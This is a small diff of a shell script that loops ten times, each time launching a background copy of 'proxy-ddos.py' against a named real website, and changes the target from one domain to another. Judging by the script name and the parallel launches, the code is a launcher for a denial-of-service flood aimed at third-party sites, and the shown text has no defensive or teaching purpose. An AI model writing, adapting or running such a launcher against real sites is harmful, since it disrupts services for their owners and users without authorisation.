@@ -2,7 +2,7 @@
 
 for i in {1..10};
 do
-    python proxy-ddos.py http://www.itmian4.com/ &
+    python proxy-ddos.py http://yanhaijing.com/ &
     echo $i
 done
 
